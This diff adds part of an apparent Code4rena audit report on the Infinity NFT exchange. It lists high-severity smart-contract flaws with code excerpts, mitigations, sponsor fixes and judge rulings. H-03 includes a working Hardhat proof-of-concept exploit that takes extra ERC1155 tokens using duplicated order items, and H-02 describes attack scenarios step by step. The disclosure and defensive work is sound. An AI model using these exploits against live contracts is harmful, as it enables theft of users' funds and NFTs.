@@ -1,0 +1,244 @@
+[H-01] Maker buy order with no specified NFT tokenIds may get fulfilled inmatchOneToManyOrderswithout receiving any NFT
+Submitted by WatchPug, also found by 0xsanson, PwnedNoMore, and unforgiven
+The call stack: matchOneToManyOrders() -> _matchOneMakerSellToManyMakerBuys() -> _execMatchOneMakerSellToManyMakerBuys() -> _execMatchOneToManyOrders() -> _transferMultipleNFTs()
+Based on the context, a maker buy order can setOrderItem.tokensas an empty array to indicate that they can accept any tokenId in this collection, in that case,InfinityOrderBookComplication.doTokenIdsIntersect()will always returntrue.
+However, when the system matching a sell order with many buy orders, theInfinityOrderBookComplicationcontract only ensures that the specified tokenIds intersect with the sell order, and the total count of specified tokenIds equals the sell order’s quantity (makerOrder.constraints[0]).
+This allows any maker buy order with same collection andempty tokenIdsto be added tomanyMakerOrdersas long as there is another maker buy order with specified tokenIds that matched the sell order’s tokenIds.
+https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityOrderBookComplication.sol#L68-L116
+functioncanExecMatchOneToMany(OrderTypes.MakerOrdercalldatamakerOrder,OrderTypes.MakerOrder[]calldatamanyMakerOrders)externalviewoverridereturns(bool) {uint256numItems;boolisOrdersTimeValid=true;boolitemsIntersect=true;uint256ordersLength=manyMakerOrders.length;for(uint256i=0;i<ordersLength; ) {if(!isOrdersTimeValid|| !itemsIntersect) {returnfalse;// short circuit}uint256nftsLength=manyMakerOrders[i].nfts.length;for(uint256j=0;j<nftsLength; ) {numItems+=manyMakerOrders[i].nfts[j].tokens.length;unchecked{++j;}}isOrdersTimeValid=isOrdersTimeValid&&manyMakerOrders[i].constraints[3] <=block.timestamp&&manyMakerOrders[i].constraints[4] >=block.timestamp;itemsIntersect=itemsIntersect&&doItemsIntersect(makerOrder.nfts,manyMakerOrders[i].nfts);unchecked{++i;}}bool_isTimeValid=isOrdersTimeValid&&makerOrder.constraints[3] <=block.timestamp&&makerOrder.constraints[4] >=block.timestamp;uint256currentMakerOrderPrice=_getCurrentPrice(makerOrder);uint256sumCurrentOrderPrices=_sumCurrentPrices(manyMakerOrders);bool_isPriceValid=false;if(makerOrder.isSellOrder) {_isPriceValid=sumCurrentOrderPrices>=currentMakerOrderPrice;}else{_isPriceValid=sumCurrentOrderPrices<=currentMakerOrderPrice;}return(numItems==makerOrder.constraints[0]) &&_isTimeValid&&itemsIntersect&&_isPriceValid;}
+However, becausebuy.nftsis used asOrderItemto transfer the nfts from seller to buyer, and there are no tokenIds specified in the matched maker buy order, the buyer wont receive any nft (_transferERC721sdoes nothing, 0 transfers) despite the buyer paid full in price.
+https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L763-L786
+function_execMatchOneMakerSellToManyMakerBuys(bytes32sellOrderHash,bytes32buyOrderHash,OrderTypes.MakerOrdercalldatasell,OrderTypes.MakerOrdercalldatabuy,uint256startGasPerOrder,uint256execPrice,uint16protocolFeeBps,uint32wethTransferGasUnits,addressweth)internal{isUserOrderNonceExecutedOrCancelled[buy.signer][buy.constraints[5]] =true;uint256protocolFee= (protocolFeeBps*execPrice) /10000;uint256remainingAmount=execPrice-protocolFee;_execMatchOneToManyOrders(sell.signer,buy.signer,buy.nfts,buy.execParams[1],remainingAmount);_emitMatchEvent(sellOrderHash,buyOrderHash,sell.signer,buy.signer,buy.execParams[0],buy.execParams[1],execPrice);
+https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1080-L1092
+function_transferERC721s(addressfrom,addressto,OrderTypes.OrderItemcalldataitem)internal{uint256numTokens=item.tokens.length;for(uint256i=0;i<numTokens; ) {IERC721(item.collection).safeTransferFrom(from,to,item.tokens[i].tokenId);unchecked{++i;}}}
+Proof of Concept
+Alice signed and submitted a maker buy order #1, to buy2Punk with2 WETHand specified tokenIds =1,2Bob signed and submitted a maker buy order #2, to buy1Punk with1 WETHand with no specified tokenIds.Charlie signed and submitted a maker sell order #3, ask for3 WETHfor2Punk and specified tokenIds =1,2The match executor calledmatchOneToManyOrders()match Charlie’s sell order #3 with buy order #1 and #2, Alice received2Punk, Charlie received3 WETH, Bob paid1 WETHand get nothing in return.
+Recommendation
+Change to:
+functioncanExecMatchOneToMany(OrderTypes.MakerOrdercalldatamakerOrder,OrderTypes.MakerOrder[]calldatamanyMakerOrders)externalviewoverridereturns(bool) {uint256numItems;uint256numConstructedItems;boolisOrdersTimeValid=true;boolitemsIntersect=true;uint256ordersLength=manyMakerOrders.length;for(uint256i=0;i<ordersLength; ) {if(!isOrdersTimeValid|| !itemsIntersect) {returnfalse;// short circuit}numConstructedItems+=manyMakerOrders[i].constraints[0];uint256nftsLength=manyMakerOrders[i].nfts.length;for(uint256j=0;j<nftsLength; ) {numItems+=manyMakerOrders[i].nfts[j].tokens.length;unchecked{++j;}}isOrdersTimeValid=isOrdersTimeValid&&manyMakerOrders[i].constraints[3] <=block.timestamp&&manyMakerOrders[i].constraints[4] >=block.timestamp;itemsIntersect=itemsIntersect&&doItemsIntersect(makerOrder.nfts,manyMakerOrders[i].nfts);unchecked{++i;}}bool_isTimeValid=isOrdersTimeValid&&makerOrder.constraints[3] <=block.timestamp&&makerOrder.constraints[4] >=block.timestamp;uint256currentMakerOrderPrice=_getCurrentPrice(makerOrder);uint256sumCurrentOrderPrices=_sumCurrentPrices(manyMakerOrders);bool_isPriceValid=false;if(makerOrder.isSellOrder) {_isPriceValid=sumCurrentOrderPrices>=currentMakerOrderPrice;}else{_isPriceValid=sumCurrentOrderPrices<=currentMakerOrderPrice;}return(numItems==makerOrder.constraints[0]) && (numConstructedItems==numItems) &&_isTimeValid&&itemsIntersect&&_isPriceValid;}
+nneverlander (Infinity) confirmed and resolved:
+Fixed inhttps://github.com/infinitydotxyz/exchange-contracts-v2/commit/7f0e195d52165853281b971b8610b27140da6e41
+HardlyDifficult (judge) commented:
+Confirmed the scenario as described.Buyers specifying just a collection and no specific tokens is a basically a floor sweep which has become common for NFTs. In this scenario, the warden shows how a buyer can end up spending money and get nothing in return. This is a High risk issue.Issue#314is very similar but flips the impact to explore how a seller’s offer could be attacked and how it applies to an allow list of tokenIds. (It has been grouped with H-01)
+
+[H-02] Loss of funds inmatchOneToManyOrders()andtakeOrders()andmatchOrders()because code don’t check that different ids in one collection are different, so it’s possible to sell one id multiple time instead of selling multiple id one time in one collection of order (lack of checks indoTokenIdsIntersect()especially for ERC1155 tokens)
+Submitted by unforgiven
+https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityOrderBookComplication.sol#L271-L312
+https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityOrderBookComplication.sol#L59-L116
+https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L245-L294
+https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityOrderBookComplication.sol#L118-L143
+https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L330-L364
+https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L934-L951
+https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityOrderBookComplication.sol#L145-L164
+https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L171-L243
+Impact
+FunctionmatchOneToManyOrders()andtakeOrders()andmatchOrders()suppose to matchsell ordertobuy orderand should perform some checks to ensure that user specified parameters in orders which are signed are not violated when order matching happens. but There is no check in their execution flow to check that anorderhas differentNFT token idsin each one of it’s collections, so even so number of tokens could be valid inordertoordertransfer but the number of real transferred tokens and their IDs can be different than what user specified and signed. and user funds would be lost. (because ofERC1155there can be more than one token for atokenId, so it would be possible to transfer it)
+Proof of Concept
+This is_takeOrders()andandcode:
+/*** @notice Internal helper function to take orders* @dev verifies whether order can be executed* @param makerOrder the maker order* @param takerItems nfts to be transferred* @param execPrice execution price*/function _takeOrders(OrderTypes.MakerOrder calldata makerOrder,OrderTypes.OrderItem[] calldata takerItems,uint256 execPrice) internal {bytes32 makerOrderHash = _hash(makerOrder);bool makerOrderValid = isOrderValid(makerOrder, makerOrderHash);bool executionValid = IComplication(makerOrder.execParams[0]).canExecTakeOrder(makerOrder, takerItems);require(makerOrderValid && executionValid, 'order not verified');_execTakeOrders(makerOrderHash, makerOrder, takerItems, makerOrder.isSellOrder, execPrice);}
+As you can see it usescanExecTakeOrder()to check that it is valid to perform matching. This iscanExecTakeOrder()andareTakerNumItemsValid()anddoTokenIdsIntersect()code which are used in execution flow to check orders and matching validity:
+/*** @notice Checks whether take orders with a higher order intent can be executed* @dev This function is called by the main exchange to check whether take orders with a higher order intent can be executed.It checks whether orders have the right constraints - i.e they have the right number of items, whether time is still validand whether the nfts intersect* @param makerOrder the maker order* @param takerItems the taker items specified by the taker* @return returns whether order can be executed*/function canExecTakeOrder(OrderTypes.MakerOrder calldata makerOrder, OrderTypes.OrderItem[] calldata takerItems)externalviewoverridereturns (bool){return (makerOrder.constraints[3] <= block.timestamp &&makerOrder.constraints[4] >= block.timestamp &&areTakerNumItemsValid(makerOrder, takerItems) &&doItemsIntersect(makerOrder.nfts, takerItems));}/// @dev sanity check to make sure that a taker is specifying the right number of itemsfunction areTakerNumItemsValid(OrderTypes.MakerOrder calldata makerOrder, OrderTypes.OrderItem[] calldata takerItems)publicpurereturns (bool){uint256 numTakerItems = 0;uint256 nftsLength = takerItems.length;for (uint256 i = 0; i < nftsLength; ) {unchecked {numTakerItems += takerItems[i].tokens.length;++i;}}return makerOrder.constraints[0] == numTakerItems;}/*** @notice Checks whether tokenIds intersect* @dev This function checks whether there are intersecting tokenIds between two order items* @param item1 first item* @param item2 second item* @return returns whether tokenIds intersect*/function doTokenIdsIntersect(OrderTypes.OrderItem calldata item1, OrderTypes.OrderItem calldata item2)publicpurereturns (bool){uint256 item1TokensLength = item1.tokens.length;uint256 item2TokensLength = item2.tokens.length;// case where maker/taker didn't specify any tokenIds for this collectionif (item1TokensLength == 0 || item2TokensLength == 0) {return true;}uint256 numTokenIdsPerCollMatched = 0;for (uint256 k = 0; k < item2TokensLength; ) {for (uint256 l = 0; l < item1TokensLength; ) {if (item1.tokens[l].tokenId == item2.tokens[k].tokenId && item1.tokens[l].numTokens == item2.tokens[k].numTokens) {// increment numTokenIdsPerCollMatchedunchecked {++numTokenIdsPerCollMatched;}// short circuitbreak;}unchecked {++l;}}unchecked {++k;}}return numTokenIdsPerCollMatched == item2TokensLength;}
+As you can see there is no logic to check thattoken IDsin one collection of order are different and code only checks that total number of tokens in oneordermatches the number of tokens specified and the ids in one order exists in other list defined. functiondoTokenIdsIntersect()checks to see thattokens idsin one collection can match list of specified tokens. because of this check lacking there are some scenarios that can cause fund lose forERC1155tokens (normalERC721requires more strange conditions). here is first example:
+For simplicity, let’s assume collection and timestamp are valid and match for orders and token isERC1155user1has signed this order: A:(user1 BUY 3 NFT IDs[(1,1),(2,1),(3,1)] at 15 ETH)(buy1token of eachid=1,2,3)NFT ID[1]fair price is1 ETH,NFT ID[2]fair price is2 ETH,NFT ID[3]fair price is12 ETHattackerwho has 3 ofNFT ID[1]create this list: B:(NFT IDs[(1,1), (1,1), (1,1)] )(list to trade1token ofid=1for 3 times)Attacker calltakeOrders()with this parameters: makerOrder: A , takerNfts: BContract logic would check all the conditions and validate and verify orders and their matching (they intersect and total number of token to sell is equal to total number of tokens to buy and all of the B list is inside A list) and perform the transaction.attackerwould receive15 ETHfor his 3 token ofNFT ID[1]and stealuser1funds.user1would receive 3 ofNFT ID[1]and pays15 ETHand even so his order A has been executed he doesn’t receiveNFT IDs[(2,1),(3,1)]and contract would violates his signed parameters.
+This examples shows that in verifying one to many order code should verify that one order’s one  collection’s token ids are not duplicates. (the functiondoTokenIdsIntersect()doesn’t check for this).
+This scenario is performable tomatchOneToManyOrders()andmatchOrders()and but exists in their code (related check logics) too. more important things about this scenario is that it doesn’t require off-chain maching engine to make mistake or malicious act, anyone can calltakeOrders()if NFT tokens areERC1155. for otherNFTtokens to perform this attack it requires thatseller==buyeror some other strange cases (like auto selling when receiving in one contract).
+Tools Used
+VIM
+Recommended Mitigation Steps
+Add checks to ensureorder’s onecollection’s token ids are not duplicate indoTokenIdsIntersect()
+nneverlander (Infinity) confirmed and resolved:
+Agree with assessment. Fixed.https://github.com/infinitydotxyz/exchange-contracts-v2/commit/c3c0684ac02e0cf1c03cdbee7e68c5a37fa334a8and removed support for ERC1155
+HardlyDifficult (judge) commented:
+This is an interesting scenario where the same NFT appears multiple times in a match and results in one order being under filled, leading to potential losses for the user. And the attack does not depend on the matching engine. Agree this is High risk.
+
+[H-03]canExecTakeOrdermismatchesmakerOrderandtakerItemswhen duplicated items present
+Submitted by PwnedNoMore, also found by 0xsanson, hyh, k, throttle, and zzzitron
+https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityOrderBookComplication.sol#L154-L164
+https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityOrderBookComplication.sol#L68-L116
+https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L336-L364
+https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L178-L243
+Impact
+When any user provides asellOrderand they are trying to sell multiple tokens fromn(n > 1) differentERC1155collections in a single order, hakcers can get the tokens of most expensive collections (with n times of the original amount) by paying the same price.
+In short, hackers can violate the user-defined orders.
+Root Cause
+The logic ofcanExecTakeOrderandcanExecMatchOneToManyis not correct.
+Let’s takecanExecTakeOrder(OrderTypes.MakerOrder calldata makerOrder, OrderTypes.OrderItem[] calldata takerItems)as an example, whilecanExecMatchOneToManyshares the same error.
+Specifically, it first checks whether the number of selling item inmakerOrdermatches with the ones intakerItems. Note that the number is an aggregated one. Then, it check whether all the items intakerItemsare within the scope defined bymakerOrder.
+The problem comes when there are duplicated items intakerItems. The aggregated number would be correct and all taker’s Items are indeed in the order. However, it does not meanstakerItemsexactly matches all items inmakerOrder, which means violation of the order.
+For example, if the order requires
+[{collection: mock1155Contract1.address,tokens: [{ tokenId: 0, numTokens: 1 }]},{collection: mock1155Contract2.address,tokens: [{ tokenId: 0, numTokens: 1 }]}];
+and the taker provides
+[{collection: mock1155Contract1.address,tokens: [{ tokenId: 0, numTokens: 1 }]},{collection: mock1155Contract1.address,tokens: [{ tokenId: 0, numTokens: 1 }]}];
+The taker can grabs twomock1155Contract1tokens by paying the order which tries to sell amock1155Contract1token and amock1155Contract2token. Whenmock1155Contract1is much more expensive, the victim user will suffer from a huge loss.
+As for the approving issue, the users may grant the contract unlimited access, or they may have another order which sellsmock1155Contract1tokens. The attack is easy to perform.
+Proof of Concept
+First put theMockERC1155.solunder thecontracts/directory:
+// SPDX-License-Identifier: MITpragmasolidity0.8.14;import{ERC1155URIStorage}from'@openzeppelin/contracts/token/ERC1155/extensions/ERC1155URIStorage.sol';import{ERC1155}from'@openzeppelin/contracts/token/ERC1155/ERC1155.sol';import{Ownable}from'@openzeppelin/contracts/access/Ownable.sol';contractMockERC1155isERC1155URIStorage,Ownable{uint256numMints;constructor(stringmemoryuri)ERC1155(uri) {}functionmint(addressto,uint256id,uint256amount,bytesmemorydata)externalonlyOwner{super._mint(to,id,amount,data);}}
+And then putpoc.jsunder thetest/directory.
+const{expect} =require('chai');const{ethers,network} =require('hardhat');const{deployContract,NULL_ADDRESS,nowSeconds} =require('../tasks/utils');const{getCurrentSignedOrderPrice,approveERC20,grantApprovals,signOBOrder} =require('../helpers/orders');asyncfunctionprepare1155OBOrder(user,chainId,signer,order,infinityExchange) {// grant approvalsconstapprovals=awaitgrantApprovals(user,order,signer,infinityExchange.address);if(!approvals) {returnundefined;}// sign orderconstsignedOBOrder=awaitsignOBOrder(chainId,infinityExchange.address,order,signer);constisSigValid=awaitinfinityExchange.verifyOrderSig(signedOBOrder);if(!isSigValid) {console.error('Signature is invalid');returnundefined;}returnsignedOBOrder;}describe('PoC',function() {letsigners,dev,matchExecutor,victim,hacker,token,infinityExchange,mock1155Contract1,mock1155Contract2,obComplicationconstsellOrders= [];letorderNonce=0;constUNIT=toBN(1e18);constINITIAL_SUPPLY=toBN(1_000_000).mul(UNIT);consttotalNFTSupply=100;constnumNFTsToTransfer=50;constnumNFTsLeft=totalNFTSupply-numNFTsToTransfer;functiontoBN(val) {returnethers.BigNumber.from(val.toString());}before(async()=>{// signerssigners=awaitethers.getSigners();dev=signers[0];matchExecutor=signers[1];victim=signers[2];hacker=signers[3];// tokentoken=awaitdeployContract('MockERC20',awaitethers.getContractFactory('MockERC20'),signers[0]);// NFT constracts (ERC1155)mock1155Contract1=awaitdeployContract('MockERC1155',awaitethers.getContractFactory('MockERC1155'),dev, ['uri1']);mock1155Contract2=awaitdeployContract('MockERC1155',awaitethers.getContractFactory('MockERC1155'),dev, ['uri2']);// ExchangeinfinityExchange=awaitdeployContract('InfinityExchange',awaitethers.getContractFactory('InfinityExchange'),dev,[token.address,matchExecutor.address]);// OB complicationobComplication=awaitdeployContract('InfinityOrderBookComplication',awaitethers.getContractFactory('InfinityOrderBookComplication'),dev);// add currencies to registryawaitinfinityExchange.addCurrency(token.address);awaitinfinityExchange.addCurrency(NULL_ADDRESS);// add complications to registryawaitinfinityExchange.addComplication(obComplication.address);// send assetsawaittoken.transfer(victim.address,INITIAL_SUPPLY.div(4).toString());awaittoken.transfer(hacker.address,INITIAL_SUPPLY.div(4).toString());for(leti=0;i<numNFTsToTransfer;i++) {awaitmock1155Contract1.mint(victim.address,i,50,'0x');awaitmock1155Contract2.mint(victim.address,i,50,'0x');}});describe('StealERC1155ByDuplicateItems', ()=>{it('Passed test denotes successful hack',asyncfunction() {// prepare orderconstuser= {address:victim.address};constchainId=network.config.chainId??31337;constnfts= [{collection:mock1155Contract1.address,tokens:[{tokenId:0,numTokens:1}]},{collection:mock1155Contract2.address,tokens:[{tokenId:0,numTokens:1}]}];constexecParams= {complicationAddress:obComplication.address,currencyAddress:token.address};constextraParams= {};constnonce= ++orderNonce;constorderId=ethers.utils.solidityKeccak256(['address','uint256','uint256'], [user.address,nonce,chainId]);letnumItems=0;for(constnftofnfts) {numItems += nft.tokens.length;}constorder= {id:orderId,chainId,isSellOrder:true,signerAddress:user.address,numItems,startPrice:ethers.utils.parseEther('1'),endPrice:ethers.utils.parseEther('1'),startTime:nowSeconds(),endTime:nowSeconds().add(10*60),nonce,nfts,execParams,extraParams};constsellOrder=awaitprepare1155OBOrder(user,chainId,victim,order,infinityExchange);expect(sellOrder).to.not.be.undefined;// form matching nftsconstnfts_= [{collection:mock1155Contract1.address,tokens:[{tokenId:0,numTokens:1}]},{collection:mock1155Contract1.address,tokens:[{tokenId:0,numTokens:1}]}];// approve currencyletsalePrice=getCurrentSignedOrderPrice(sellOrder);awaitapproveERC20(hacker.address,token.address,salePrice,hacker,infinityExchange.address);// perform exchangeawaitinfinityExchange.connect(hacker).takeOrders([sellOrder], [nfts_]);// owners after sale// XXX: note that the user's intention is to send mock1155Contract1 x 1 + mock1155Contract2 x 1// When mock1155Contract1 is much more expensive than mock1155Contract2, user suffers from huge lossexpect(awaitmock1155Contract1.balanceOf(hacker.address,0)).to.equal(2);});});});
+And run
+$ npx hardhattest--grep PoCPoCStealERC1155ByDuplicateItems✓ Passedtestdenotes successful hack
+Note that the passed test denotes a successful hack.
+Recommended Mitigation Steps
+I would suggest a more gas-consuming approach by hashing all the items and putting them into a list. Then checking whether the lists match.
+nneverlander (Infinity) confirmed and resolved:
+Fixed inhttps://github.com/infinitydotxyz/exchange-contracts-v2/commit/bbbd362f18a2bb1992620a76e59621132b8a3d8c.
+HardlyDifficult (judge) commented:
+This is a High risk issue. The PoC demonstrates how a maker specifying a bundle of NFTs could incorrectly have one ERC1155 item in that bundle processed several times by the taker - the bundle is not fully accepted as expected, the item processed multiple times is essentially overfilled, and this may be abused to the taker’s advantage when the NFTs are not valued the same.
+
+[H-04] Accumulated ETH fees of InfinityExchange cannot be retrieved
+Submitted by hyh, also found by 0x29A, 0xf15ers, 0xkowloon, 0xNineDec, berndartmueller, byterocket, cccz, codexploder, GreyArt, horsefacts, IllIllI, Kenshin, kenzo, KIntern, Lambda, obront, obtarian, oyc109, peritoflores, rajatbeladiya, rfa, saian, unforgiven, WatchPug, Wayne, and zer0dot_
+ETH fees accumulated from takeOrders() and takeMultipleOneOrders() operations are permanently frozen within the contract as there is only one way designed to retrieve them, a rescueETH() function, and it will work as intended, not being able to access ETH balance of the contract.
+Setting the severity as high as the case is a violation of system’s core logic and a permanent freeze of ETH revenue of the project.
+Proof of Concept
+Fees are accrued in user-facing takeOrders() and takeMultipleOneOrders() via the following call sequences:
+takeOrders -> _takeOrders -> _execTakeOrders -> _transferNFTsAndFees -> _transferFeestakeMultipleOneOrders -> _execTakeOneOrder -> _transferNFTsAndFees -> _transferFees
+While token fees are transferred right away, ETH fees are kept with the InfinityExchange contract:
+https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1119-L1141
+/***@noticeTransfer fees. Fees are always transferred from buyer to the seller and the exchange although seller isthe one that actually 'pays' the fees*@devif the currency ETH, no additional transfer is needed to pay exchange fees since the contract is 'payable'*@paramsellerthe seller*@parambuyerthe buyer*@paramamountamount to transfer*@paramcurrencycurrency of the transfer*/function_transferFees(addressseller,addressbuyer,uint256amount,addresscurrency)internal{// protocol feeuint256protocolFee= (PROTOCOL_FEE_BPS*amount) /10000;uint256remainingAmount=amount-protocolFee;// ETHif(currency==address(0)) {// transfer amount to seller(boolsent, ) =seller.call{value:remainingAmount}('');require(sent,'failed to send ether to seller');
+i.e. whencurrencyis ETH the fee part of the amount,protocolFee, is left with the InfinityExchange contract.
+The only way to retrieve ETH from the contract is rescueETH() function:
+https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1228-L1232
+/// @dev used for rescuing exchange fees paid to the contract in ETHfunctionrescueETH(addressdestination)externalpayableonlyOwner{(boolsent, ) =destination.call{value:msg.value}('');require(sent,'failed');}
+However, it cannot reach ETH on the contract balance asmsg.valueis used as the amount to be sent over. I.e. only ETH attached to the rescueETH() call is transferred fromownertodestination. ETH funds that InfinityExchange contract holds remain inaccessible.
+Recommended Mitigation Steps
+Consider adding contract balance to the funds transferred:
+/// @dev used for rescuing exchange fees paid to the contract in ETHfunctionrescueETH(addressdestination)externalpayableonlyOwner{-   (boolsent, ) =destination.call{value:msg.value}('');+   (boolsent, ) =destination.call{value:address(this).balance}('');require(sent,'failed');}
+nneverlander (Infinity) confirmed
+HardlyDifficult (judge) commented:
+When an order is filled using ETH, the exchange collects fees by holding them in the contract for later withdraw. However the only withdraw mechanism does not work so that ETH becomes trapped forever.This is a High risk issue since some ETH is lost with each ETH based trade.
+
+[H-05] Missing Complication check intakeMultipleOneOrders
+Submitted by shenwilly
+An order’s type and it’s rules are defined in it’sComplication. Not checking it would allow anyone to take any orders regardless of their Complication’s rule, causing unexpected execution for order makers.
+takeMultipleOneOrdersassumes that allmakerOrdersare simple orderbook orders and the  Complication check is missing here.
+Proof of Concept
+Alice signs a makerOrder withPrivateSaleComplication, allowing only Bob to take the private sale order.A malicious trader callstakeMultipleOneOrdersto take Alice’s order, despite the Complication only allowing Bob to take it.
+Recommended Mitigation Steps
+AddcanExecTakeOneOrderfunction in IComplication.sol and implement it inInfinityOrderBookComplication(and future Complications) to supporttakeMultipleOneOrdersoperation, then modifytakeMultipleOneOrdersto use the check:
+function takeMultipleOneOrders() {...for (uint256 i = 0; i < numMakerOrders; ) {bytes32 makerOrderHash = _hash(makerOrders[i]);bool makerOrderValid = isOrderValid(makerOrders[i], makerOrderHash);bool executionValid = IComplication(makerOrders[i].execParams[0]).canExecTakeOneOrder(makerOrders[i]);require(makerOrderValid && executionValid, 'order not verified');require(currency == makerOrders[i].execParams[1], 'cannot mix currencies');require(isMakerSeller == makerOrders[i].isSellOrder, 'cannot mix order sides');uint256 execPrice = _getCurrentPrice(makerOrders[i]);totalPrice += execPrice; // @audit-issue missing complication check_execTakeOneOrder(makerOrderHash, makerOrders[i], isMakerSeller, execPrice);unchecked {++i;}}...}
+nneverlander (Infinity) confirmed and resolved:
+fixed inhttps://github.com/infinitydotxyz/exchange-contracts-v2/commit/0b7608a2c9efc71d902a9c90f4731ef434b42c31.
+HardlyDifficult (judge) commented:
+takeMultipleOneOrdersdoes not check restrictions set via the Complication. Agree with the High risk assessment here.
+
+[H-06] Some real-world NFT tokens may support both ERC721 and ERC1155 standards, which may breakInfinityExchange::_transferNFTs
+Submitted by PwnedNoMore
+Many real-world NFT tokens may support both ERC721 and ERC1155 standards, which may breakInfinityExchange::_transferNFTs, i.e., transferring less tokens than expected.
+For example, the asset token ofThe Sandbox Game, a Top20 ERC1155 token onEtherscan, supports both ERC1155 and ERC721 interfaces. Specifically, any ERC721 token transfer is regarded as an ERC1155 token transfer with only one item transferred (token addressandimplementation).
+Assuming there is a user tries to buy two tokens of Sandbox’s ASSETs with the same token id, the actual transferring is carried byInfinityExchange::_transferNFTswhich first checks ERC721 interface supports and then ERC1155.
+function_transferNFTs(addressfrom,addressto,OrderTypes.OrderItemcalldataitem)internal{if(IERC165(item.collection).supportsInterface(0x80ac58cd)) {_transferERC721s(from,to,item);}elseif(IERC165(item.collection).supportsInterface(0xd9b67a26)) {_transferERC1155s(from,to,item);}}
+The code will go into_transferERC721sinstead of_transferERC1155s, since the Sandbox’s ASSETs also support ERC721 interface. Then,
+function_transferERC721s(addressfrom,addressto,OrderTypes.OrderItemcalldataitem)internal{uint256numTokens=item.tokens.length;for(uint256i=0;i<numTokens; ) {IERC721(item.collection).safeTransferFrom(from,to,item.tokens[i].tokenId);unchecked{++i;}}}
+Since theERC721(item.collection).safeTransferFromis treated as an ERC1155 transferring with one item (reference), there is only one item actually gets traferred.
+That means, the user, who barely know the implementation details of his NFTs, will pay the money for two items but just got one.
+Note that the situation of combining ERC721 and ERC1155 is prevalent and poses a great vulnerability of the exchange contract.
+Proof of Concept
+Check the return values ofSandbox’s ASSETs’ssupportInterface, bothsupportInterface(0x80ac58cd)andsupportInterface(0xd9b67a26)return true.
+Recommended Mitigation Steps
+Reorder the checks,e.g.,
+function_transferNFTs(addressfrom,addressto,OrderTypes.OrderItemcalldataitem)internal{if(IERC165(item.collection).supportsInterface(0xd9b67a26)) {_transferERC1155s(from,to,item);}elseif(IERC165(item.collection).supportsInterface(0x80ac58cd)) {_transferERC721s(from,to,item);}}
+nneverlander (Infinity) confirmed and resolved:
+Fixed inhttps://github.com/infinitydotxyz/exchange-contracts-v2/commit/377c77f0888fea9ca1e087de701b5384a046f760.
+HardlyDifficult commented:
+When an NFT supports both 721 & 1155 interfaces, the code prefers_transferERC721s- however this ignores the order’snumTokens. This may result in under filling NFTs for an order, at the same cost to the buyer. The warden’s recommendation would address this concern. Or maybe_transferERC721scould requirenumTokens == 1, but that approach would be limiting for this scenario. Since the buyer gets a fraction of what they paid for and it impacts a top20 1155, this seems to be a High risk issue.
+
+[H-07]_transferNFTs()succeeds even if no transfer is performed
+Submitted by k, also found by 0x29A, 0xf15ers, 0xsanson, antonttc, hyh, PwnedNoMore, and zzzitron
+If an NFT is sold that does not specify support for the ERC-721 or ERC-1155 standard interface, the sale will still succeed. In doing so, the seller will receive funds from the buyer, but the buyer will not receive any NFT from the seller. This could happen in the following cases:
+A token that claims to be ERC-721/1155 compliant, but fails to implement thesupportsInterface()function properly.An NFT that follows a standard other than ERC-721/1155 and does not implement their EIP-165 interfaces.A malicious contract that is deployed to take advantage of this behavior.
+Proof of Concept
+https://gist.github.com/kylriley/3bf0e03d79b3d62dd5a9224ca00c4cb9
+Recommended Mitigation Steps
+If neither the ERC-721 nor the ERC-1155 interface is supported the function should revert. An alternative approach would be to attempt atransferFromand check the balance before and after to ensure that it succeeded.
+nneverlander (Infinity) confirmed and resolved:
+Fixed inhttps://github.com/infinitydotxyz/exchange-contracts-v2/commit/377c77f0888fea9ca1e087de701b5384a046f760
+HardlyDifficult (judge) commented:
+IfsupportsInterfacereturns false for both 721 & 1155 then no NFT is transferred but funds are still sent to the seller.A number of NFTs do not fully comply with the 721/1155 standards. Since the order is not canceled or the tx reverted, this seems like a High risk issue.
+
+[H-08] Overpayment of native ETH is not refunded to buyer
+Submitted by horsefacts, also found by 0x29A, antonttc, berndartmueller, byterocket, cccz, codexploder, dipp, GimelSec, GreyArt, Lambda, oyc109, Ruhum, and unforgiven_
+https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L119-L121
+https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1228-L1232
+Vulnerability Details
+InfinityExchangeaccepts payments in native ETH, but does not return overpayments to the buyer. Overpayments are likely in the case of auction orders priced in native ETH.
